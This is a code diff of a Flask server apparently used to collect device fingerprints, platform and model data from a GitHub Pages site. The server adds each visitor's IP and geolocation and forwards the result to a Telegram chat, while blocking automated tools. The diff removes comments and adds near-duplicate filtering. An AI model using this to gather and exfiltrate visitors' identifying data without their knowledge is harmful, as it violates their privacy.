@@ -14,7 +14,6 @@ import threading
 import time
 import hmac
 
-# Настройка логирования
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -32,7 +31,6 @@ cors_config = {
 }
 CORS(app, resources=cors_config)
 
-# Security headers middleware
 @app.after_request
 def security_headers(response):
     response.headers['X-Content-Type-Options'] = 'nosniff'
@@ -44,9 +42,8 @@ def security_headers(response):
     response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
     return response
 
-# Rate limiting для защищенных эндпоинтов
 rate_limit_store = {}
-blocked_ips = {}  # {ip: timestamp_until_blocked}
+blocked_ips = {}
 
 def rate_limit(max_attempts=5, window_seconds=300):
     def decorator(f):
@@ -55,10 +52,8 @@ def rate_limit(max_attempts=5, window_seconds=300):
             client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
             now = datetime.now().timestamp()
             
-            # Проверка блокировки IP
             if client_ip in blocked_ips:
                 if blocked_ips[client_ip] == float('inf'):
-                    # Постоянная блокировка
                     logger.error(f"PERMANENTLY BLOCKED IP {client_ip} attempted to access {f.__name__}")
                     return jsonify({'error': 'IP permanently blocked for automated tools abuse.'}), 403
                 elif now < blocked_ips[client_ip]:
@@ -66,7 +61,6 @@ def rate_limit(max_attempts=5, window_seconds=300):
                     logger.warning(f"Blocked IP {client_ip} attempted to access {f.__name__}. Unblock in {remaining}s")
                     return jsonify({'error': f'IP temporarily blocked. Try again in {remaining} seconds.'}), 403
                 else:
-                    # Блокировка истекла
                     del blocked_ips[client_ip]
             
             key = f"{f.__name__}_{client_ip}"
@@ -78,8 +72,7 @@ def rate_limit(max_attempts=5, window_seconds=300):
             rate_limit_store[key] = [t for t in rate_limit_store[key] if now - t < window_seconds]
             
             if len(rate_limit_store[key]) >= max_attempts:
-                # Блокируем IP на 30 минут при превышении лимита
-                blocked_ips[client_ip] = now + 1800  # 30 минут
+                blocked_ips[client_ip] = now + 1800
                 logger.error(f"IP {client_ip} blocked for 30 minutes after exceeding rate limit on {f.__name__}")
                 return jsonify({'error': 'Rate limit exceeded. IP blocked for 30 minutes.'}), 429
             
@@ -122,6 +115,18 @@ def block_automated_tools():
         return jsonify({'error': 'Automated tools are permanently blocked.'}), 403
     return None
 
+def calculate_similarity(text1, text2):
+    words1 = set(text1.lower().split())
+    words2 = set(text2.lower().split())
+
+    if not words1 or not words2:
+        return 0.0
+
+    intersection = words1.intersection(words2)
+    union = words1.union(words2)
+
+    return (len(intersection) / len(union)) * 100.0
+
 def generate_request_signature(data):
     """Генерация HMAC-SHA256 подписи для проверки целостности запросов"""
     secret = os.environ.get('REQUEST_SECRET', 'default-secret-CHANGE-ME-NOW')
@@ -134,10 +139,9 @@ def verify_request_integrity(data, provided_signature):
     return hmac.compare_digest(provided_signature, expected_signature)
 
 @app.route('/collect', methods=['POST'])
-@rate_limit(max_attempts=5, window_seconds=300)  # 5 запросов в 5 минут
+@rate_limit(max_attempts=5, window_seconds=300)
 def collect():
     try:
-        # Блокировка автоматизированных инструментов
         block_result = block_automated_tools()
         if block_result:
             return block_result
@@ -148,7 +152,6 @@ def collect():
         if not content:
             return jsonify({'status': 'error', 'message': 'No content provided'}), 400
 
-        # Проверка Origin для дополнительной защиты
         origin = request.headers.get('Origin', '')
         referer = request.headers.get('Referer', '')
         allowed_origins = ['https://gitububkm.github.io']
@@ -161,15 +164,21 @@ def collect():
             logger.warning(f"Invalid Referer: {referer}")
             return jsonify({'status': 'error', 'message': 'Invalid Referer'}), 403
 
-        # Проверка дубликатов
         content_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
         reg = load_registry()
+
         if content_hash in reg.get('sent_hashes', {}):
-            logger.info(f"Duplicate content detected: {content_hash[:16]}...")
+            logger.info(f"Exact duplicate content detected: {content_hash[:16]}...")
             return jsonify({'status': 'ok', 'message': 'Duplicate ignored'}), 200
+
+        sent_contents = reg.get('sent_contents', [])
+        similarity_threshold = 70.0
+
+        for existing_content in sent_contents[-50:]:
+            if calculate_similarity(content, existing_content) >= similarity_threshold:
+                logger.info(f"Similar content detected (>{similarity_threshold}% similarity), skipping...")
+                return jsonify({'status': 'ok', 'message': 'Similar content ignored'}), 200
         
-        # Получаем IP клиента и добавляем geoинформацию
-        # Приоритет: CF-Connecting-IP > True-Client-IP > X-Forwarded-For > remote_addr
         client_ip = (
             request.headers.get('CF-Connecting-IP', '') or
             request.headers.get('True-Client-IP', '') or
@@ -177,7 +186,6 @@ def collect():
             request.remote_addr or ''
         ).strip()
         
-        # Для Render может быть IP сервера, пытаемся получить реальный IP через внешний API
         if not client_ip or client_ip in ['127.0.0.1', '::1']:
             try:
                 import urllib.request
@@ -187,14 +195,12 @@ def collect():
             except:
                 pass
         
-        # Добавляем информацию о провайдере и геолокации в начало контента OK
         server_block = []
         server_block.append('\n=== Server Enriched Data ===')
         server_block.append(f'client_ip_detected: {client_ip}')
         server_block.append(f'x_forwarded_for: {request.headers.get("X-Forwarded-For", "none")}')
         server_block.append(f'remote_addr: {request.remote_addr or "none"}')
         
-        # Получаем геолокацию от ipinfo.io
         try:
             import urllib.request
             import json as _json
@@ -211,10 +217,8 @@ def collect():
         except Exception as e:
             server_block.append(f'geo_error: {str(e)[:100]}')
         
-        # Вставляем server_block в начало контента
         enriched_content = '\n'.join(server_block) + '\n' + content
         
-        # Получаем настройки Telegram
         telegram_bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '')
         telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID', '')
         
@@ -222,23 +226,19 @@ def collect():
             logger.error("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured")
             return jsonify({'status': 'error', 'message': 'Telegram not configured'}), 500
         
-        # Формируем имя файла
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         platform = data.get('platform', 'unknown').replace(' ', '_')[:20]
         model = data.get('model', 'unknown').replace(' ', '_')[:20]
         filename = f"{platform}_{model}_{timestamp}.txt"
         
-        # Отправляем в Telegram
         try:
             import urllib.request
             import json as _json
             
             telegram_url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
             
-            # Создаем boundary для multipart/form-data
             boundary = '----WebKitFormBoundary' + os.urandom(16).hex()
             
-            # Собираем тело запроса
             data_parts = []
             data_parts.append(f'--{boundary}\r\n'.encode())
             data_parts.append(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
@@ -249,8 +249,6 @@ def collect():
             data_parts.append(enriched_content.encode('utf-8'))
             data_parts.append(f'\r\n--{boundary}\r\n'.encode())
             
-            # Добавляем кнопку "Удалить" под каждым сообщением
-            # reply_markup для кнопки
             reply_markup = {
                 'inline_keyboard': [[
                     {'text': '🗑️ Удалить это сообщение', 'callback_data': 'delete_msg'}
@@ -263,7 +261,6 @@ def collect():
             
             body = b''.join(data_parts)
             
-            # Отправляем запрос
             req = urllib.request.Request(
                 telegram_url,
                 data=body,
@@ -273,21 +270,26 @@ def collect():
             response_data = _json.loads(resp.read())
             
             if response_data.get('ok'):
-                # Сохраняем message_id для обработки callback
                 message_id = response_data.get('result', {}).get('message_id')
                 if message_id:
                     logger.info(f"Data sent to Telegram: {filename}, message_id: {message_id}")
 
-                # Сохраняем хеш в реестр для предотвращения дубликатов
                 reg = load_registry()
                 if 'sent_hashes' not in reg:
                     reg['sent_hashes'] = {}
+                if 'sent_contents' not in reg:
+                    reg['sent_contents'] = []
+
                 reg['sent_hashes'][content_hash] = datetime.now().isoformat()
-                # Ограничиваем размер реестра (максимум 1000 записей)
+                reg['sent_contents'].append(content)
+
                 if len(reg['sent_hashes']) > 1000:
-                    # Удаляем старые записи (сортируем по дате и оставляем последние 1000)
                     sorted_hashes = sorted(reg['sent_hashes'].items(), key=lambda x: x[1], reverse=True)
                     reg['sent_hashes'] = dict(sorted_hashes[:1000])
+
+                if len(reg['sent_contents']) > 50:
+                    reg['sent_contents'] = reg['sent_contents'][-50:]
+
                 save_registry(reg)
 
                 return jsonify({'status': 'ok', 'message': 'Data sent to Telegram'}), 200
@@ -307,7 +309,6 @@ def telegram_webhook():
     try:
         data = request.get_json()
         
-        # Проверяем на callback_query (нажатие на кнопку)
         if 'callback_query' in data:
             callback = data['callback_query']
             callback_data = callback.get('data', '')
@@ -315,12 +316,9 @@ def telegram_webhook():
             message_id = message.get('message_id')
             chat_id = message.get('chat', {}).get('id')
             
-            # Если callback_data начинается с "delete_", удаляем сообщение
             if callback_data.startswith('delete_'):
-                # Отвечаем на callback (чтобы убрать загрузку с кнопки)
                 callback_id = callback.get('id')
                 
-                # Удаляем сообщение
                 telegram_bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '')
                 if telegram_bot_token and message_id and chat_id:
                     delete_url = f'https://api.telegram.org/bot{telegram_bot_token}/deleteMessage'
@@ -337,7 +335,6 @@ def telegram_webhook():
                     
                     logger.info(f"Message {message_id} deleted via button")
                 
-                # Отправляем подтверждение callback
                 if callback_id:
                     answer_url = f'https://api.telegram.org/bot{telegram_bot_token}/answerCallbackQuery'
                     answer_data = {'callback_query_id': callback_id, 'text': 'Сообщение удалено'}
@@ -362,12 +359,10 @@ def collect_old():
         if not content:
             return jsonify({'status': 'error', 'message': 'No content provided'}), 400
 
-        # ——— Fingerprint и системные признаки (для авто-имени) ———
         fp = data.get('fingerprint') or ''
         platform = (data.get('platform') or '').replace(' ', '_')
         model = (data.get('model') or '').replace(' ', '_')
         external_ip = ''
-        # --- серверные метаданные: реальный IP клиента и геоинфо ---
         client_ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '').split(',')[0].strip()
         server_block = []
         server_block.append('=== Server Observed ===')
@@ -391,19 +386,16 @@ def collect_old():
         server_block.append('')
         final_text = "\n".join(server_block) + content
 
-        # ——— Имя из реестра или формирование эвристикой ———
         reg = load_registry()
         friendly = reg.get(fp)
         if not friendly:
             base = [platform or 'Device', model or '', external_ip or '']
             base = [x for x in base if x]
             friendly = "_".join(base) or 'Unknown'
-            # не записываем автоматически, админ может позже задать через API
 
         filename = raw_filename or f"{friendly}.txt"
         if len(filename) > 100 or not filename.endswith('.txt'):
             filename = 'data.txt'
-        # Добавляем серверные метаданные
         server_block = []
         server_block.append('=== Server Observed ===')
         server_block.append(f"client_ip: {client_ip or 'unknown'}")
@@ -444,7 +436,6 @@ def list_files():
         block_result = block_automated_tools()
         if block_result:
             return block_result
-        # Проверка пароля для просмотра списка
         provided_hash = request.headers.get('X-View-Hash', '')
         correct_password = os.environ.get('SECRET_VIEW')
         
@@ -457,7 +448,6 @@ def list_files():
             logger.warning(f"Unauthorized list access attempt from {client_ip}")
             return jsonify({'error': 'Unauthorized'}), 401
         
-        # Список файлов доступен только с паролем
         files = []
         for root, dirs, filenames in os.walk(DATA_DIR):
             for filename in filenames:
@@ -485,7 +475,6 @@ def ipinfo():
         block_result = block_automated_tools()
         if block_result:
             return block_result
-        # Проверка Referer для /ipinfo
         referer = request.headers.get('Referer', '')
         origin = request.headers.get('Origin', '')
         if not referer.startswith('https://gitububkm.github.io') and not origin.startswith('https://gitububkm.github.io'):
@@ -505,9 +494,6 @@ def ipinfo():
 def verify_password_hash(provided_hash, correct_password_hash):
     """Проверка пароля - сравнение SHA-256 хешей"""
     try:
-        # correct_password_hash - это SHA-256 хеш пароля из переменных окружения
-        # provided_hash - это SHA-256 хеш от клиента
-        # Сравниваем напрямую
         return hmac.compare_digest(provided_hash, correct_password_hash)
     except Exception as e:
         logger.error(f"Password verification error: {e}")
@@ -603,10 +589,9 @@ def read_file():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/delete', methods=['DELETE'])
-@rate_limit(max_attempts=5, window_seconds=60)  # 5 удалений в минуту
+@rate_limit(max_attempts=5, window_seconds=60)
 def delete_file():
     try:
-        # Проверка пароля на сервере
         client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr
         provided_hash = request.headers.get('X-Delete-Hash', '')
         correct_password = os.environ.get('SECRET_DELETE')
@@ -637,10 +622,8 @@ def delete_file():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-# Проверка целостности — критический код не должен быть изменен
 INTEGRITY_CHECK = "backend_security_v2_2025"
 
-# Backup функция
 def create_backup():
     """Создание резервной копии данных"""
     try:
@@ -664,14 +647,12 @@ def create_backup():
     except Exception as e:
         logger.error(f"Backup error: {e}")
 
-# Автоматический backup каждый час
 def backup_scheduler():
     """Планировщик для автоматических backup"""
     while True:
-        time.sleep(3600)  # 1 час
+        time.sleep(3600)
         create_backup()
 
-# Запуск планировщика в отдельном потоке
 backup_thread = threading.Thread(target=backup_scheduler, daemon=True)
 backup_thread.start()
 logger.info("Backup scheduler started")
